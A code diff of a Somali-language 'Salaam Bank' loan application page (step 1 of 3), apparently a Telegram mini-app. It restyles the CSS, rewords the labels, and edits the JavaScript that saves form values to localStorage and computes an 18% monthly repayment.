@@ -3,174 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Codsiga Maalgelinta - Talaabada 1aad</title>
+    <title>Codsiga Amaahda - Step 1 | Salaam Bank</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #0066b2; /* Salaam Bank Logo Blue */
-            margin: 0; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            color: #333333;
-            min-height: 100vh;
-        }
-
-        .nav-header { 
-            width: 100%; 
-            background-color: #005291; /* Darker Blue Header */
-            padding: 18px 20px; 
-            color: #ffffff; 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-            box-sizing: border-box; 
-        }
-
-        .bank-logo { 
-            font-size: 22px; 
-            font-weight: bold; 
-        }
-
-        .form-card { 
-            background: #ffffff; /* Clean White Card */
-            width: 92%; 
-            max-width: 480px; 
-            margin-top: 20px; 
-            padding: 30px 20px; 
-            border-radius: 16px; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15); 
-            box-sizing: border-box; 
-        }
-
-        h2 { 
-            text-align: center; 
-            margin: 0; 
-            font-size: 24px; 
-            color: #0066b2; 
-            font-weight: 700; 
-        }
-
-        .step-info { 
-            text-align: center; 
-            font-size: 14px; 
-            color: #666666; 
-            margin: 10px 0 25px; 
-        }
-
-        .progress-box { 
-            display: flex; 
-            gap: 8px; 
-            margin-bottom: 35px; 
-        }
-
-        .bar { 
-            height: 6px; 
-            flex: 1; 
-            background: #e2e8f0; 
-            border-radius: 3px; 
-        }
-
-        .active-bar { 
-            background: #008744; /* Salaam Bank Logo Green Highlight */
-        }
-
-        .input-wrap { 
-            margin-bottom: 22px; 
-        }
-
-        label { 
-            display: block; 
-            font-size: 15px; 
-            font-weight: 600; 
-            margin-bottom: 8px; 
-            color: #444444; 
-        }
-
-        select, input, textarea { 
-            width: 100%; 
-            padding: 14px; 
-            border: 1px solid #cbd5e1; 
-            border-radius: 8px; 
-            font-size: 16px; 
-            box-sizing: border-box; 
-            background: #ffffff; 
-            color: #333333;
-            outline: none;
-        }
-
-        select:focus, input:focus, textarea:focus {
-            border-color: #0066b2;
-        }
-
-        .readonly-input {
-            background: #f1f5f9 !important;
-            color: #64748b !important;
-            border-color: #cbd5e1 !important;
-        }
-
-        .btn-container { 
-            margin-top: 30px; 
-            display: flex; 
-            flex-direction: column; 
-            gap: 12px; 
-        }
-
-        .back-btn { 
-            background-color: #f1f5f9; 
-            color: #475569; 
-            border: 1px solid #cbd5e1; 
-            padding: 16px; 
-            border-radius: 10px; 
-            font-size: 16px; 
-            font-weight: bold; 
-            cursor: pointer; 
-        }
-
-        .next-btn { 
-            background-color: #008744; /* Salaam Bank Logo Green */
-            color: #ffffff; 
-            border: none; 
-            padding: 18px; 
-            border-radius: 10px; 
-            font-size: 16px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            text-transform: uppercase; 
-            transition: background-color 0.2s ease;
-        }
-
-        .next-btn:hover {
-            background-color: #006e37;
-        }
-
-        .next-btn:active {
-            background-color: #00542a;
-        }
-
-        .footer-text { 
-            text-align: center; 
-            font-size: 12px; 
-            color: rgba(255, 255, 255, 0.8); 
-            margin-top: 40px; 
-            padding-bottom: 30px; 
-        }
+        body { font-family: -apple-system, sans-serif; background-color: #f8f9fa; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .nav-header { width: 100%; background: linear-gradient(90deg, #0B72B9 0%, #085B94 100%); padding: 15px 20px; color: white; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
+        .brand-logo { font-size: 24px; font-weight: bold; }
+        .form-card { background: white; width: 92%; max-width: 480px; margin-top: 25px; padding: 30px 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); box-sizing: border-box; }
+        h2 { text-align: center; margin: 0; font-size: 26px; color: #333; font-weight: 600; }
+        .step-info { text-align: center; font-size: 15px; color: #888; margin: 10px 0 25px; }
+        .progress-box { display: flex; gap: 8px; margin-bottom: 35px; }
+        .bar { height: 4px; flex: 1; background: #e0e0e0; border-radius: 2px; }
+        .active-bar { background: #0B72B9; }
+        .input-wrap { margin-bottom: 22px; }
+        label { display: block; font-size: 16px; font-weight: 500; margin-bottom: 10px; color: #333; }
+        select, input, textarea { width: 100%; padding: 15px; border: 1px solid #d1d1d1; border-radius: 8px; font-size: 17px; box-sizing: border-box; background: #fff; }
+        select:focus, input:focus, textarea:focus { border-color: #0B72B9; outline: none; }
+        .btn-container { margin-top: 30px; display: flex; flex-direction: column; gap: 15px; }
+        .back-btn { background-color: #f1f1f1; color: #777; border: 1px solid #ddd; padding: 16px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .next-btn { background: linear-gradient(90deg, #1B8A43 0%, #23ad54 100%); color: white; border: none; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .footer-text { text-align: center; font-size: 13px; color: #aaa; margin-top: 40px; padding-bottom: 30px; }
     </style>
 </head>
 
 <body>
 
 <div class="nav-header">
-    <div onclick="goBack()" style="cursor:pointer; font-size:18px; color: #ffffff;">← Dib u noqyo</div>
-    <div class="bank-logo">Salaam Bank</div>
-    <div style="font-size: 24px;">☰</div>
+    <div onclick="goBack()" style="cursor:pointer; font-size:20px;">← Dib u noqo</div>
+    <div class="brand-logo">Salaam Bank</div>
+    <div style="font-size: 26px;">☰</div>
 </div>
 
 <div class="form-card">
-    <h2>Codsiga Maalgelinta</h2>
-    <p class="step-info">Talaabada 1 oo 3 ah</p>
+    <h2>Codsiga Amaahda</h2>
+    <p class="step-info">Tallaabada 1 ee 3</p>
 
     <div class="progress-box">
         <div class="bar active-bar"></div>
@@ -179,38 +46,38 @@
     </div>
 
     <div class="input-wrap">
-        <label>Astaanta Maalgelinta</label>
+        <label>Nooca Amaahda</label>
         <select id="loanType">
-            <option value="Maalgelinta Shaqsiga" selected>Maalgelinta Shaqsiga</option>
-            <option value="Maalgelinta Ganacsiga">Maalgelinta Ganacsiga</option>
-            <option value="Maalgelinta Gaadiidka">Maalgelinta Gaadiidka</option>
-            <option value="Maalgelinta Guryaha">Maalgelinta Guryaha</option>
-            <option value="Maalgelinta Waxbarashada">Maalgelinta Waxbarashada</option>
+            <option value="Amaah Shakhsi ah" selected>Amaah Shakhsi ah</option>
+            <option value="Amaah Ganacsi">Amaah Ganacsi</option>
+            <option value="Amaah Baabuur">Amaah Baabuur</option>
+            <option value="Amaah Guri">Amaah Guri</option>
+            <option value="Amaah Waxbarasho">Amaah Waxbarasho</option>
         </select>
     </div>
 
     <div class="input-wrap">
-        <label>Qaddarka Maalgelinta ($ USD)</label>
-        <input type="number" id="loanAmount" class="readonly-input" readonly>
+        <label>Qaddarka Amaahda ($)</label>
+        <input type="number" id="loanAmount" readonly style="background:#f9f9f9">
     </div>
 
     <div class="input-wrap">
-        <label>Muddada Bixinta</label>
-        <input type="text" id="loanDuration" class="readonly-input" readonly>
+        <label>Muddada Amaahda</label>
+        <input type="text" id="loanDuration" readonly style="background:#f9f9f9">
     </div>
 
     <div class="input-wrap">
-        <label>Ujeeddada Maalgelinta</label>
-        <textarea id="loanPurpose" rows="3" placeholder="Maxaad u kullanaysaa maalgelintan?"></textarea>
+        <label>Ujeedada Amaahda</label>
+        <textarea id="loanPurpose" rows="3" placeholder="Maxaad u isticmaali doontaa?"></textarea>
     </div>
 
     <div class="btn-container">
-        <button class="next-btn" onclick="goNext()">TALAABADA XIGTA</button>
-        <button class="back-btn" onclick="goBack()">DIB U NOQO</button>
+        <button class="back-btn" onclick="goBack()">KA HORE</button>
+        <button class="next-btn" onclick="goNext()">TALLAABADA XIGTA</button>
     </div>
 </div>
 
-<div class="footer-text">© 2026 Salaam Bank Somalia. Hantida oo dhan waa la dhowray.</div>
+<div class="footer-text">© 2026 Salaam Bank Soomaaliya</div>
 
 <script>
     function goNext() {
@@ -225,17 +92,18 @@
         const type = typeEl.value;
 
         if (!purpose) {
-            alert("Fadlan qor ujeeddada maalgelinta.");
+            alert("Fadlan buuxi ujeedada amaahda.");
             return;
         }
 
+        // --- Standard Save ---
         localStorage.setItem('loanPurpose', purpose);
         localStorage.setItem('loanType', type);
 
-        // Clean duration string (e.g., "12 bilood" becomes "12")
-        const cleanDuration = durationVal.replace(/\D/g, '') || "12"; 
+        // --- Data Carriage ---
+        const cleanDuration = durationVal.replace(/\D/g, ''); 
         
-        // Calculate monthly repayment
+        // Monthly Repayment Calculation (Amount * 1.18 interest / duration)
         const monthly = ((Number(amountVal) * 1.18) / Number(cleanDuration)).toFixed(2);
 
         localStorage.setItem('loan_amount', amountVal);
@@ -262,7 +130,7 @@
 
         if (amountEl && durationEl) {
             amountEl.value = String(localStorage.getItem('amount') || "1000");
-            durationEl.value = String(localStorage.getItem('loanDuration') || "12 bilood");
+            durationEl.value = String(localStorage.getItem('loanDuration') || "12 Bilood");
         }
     };
 </script>
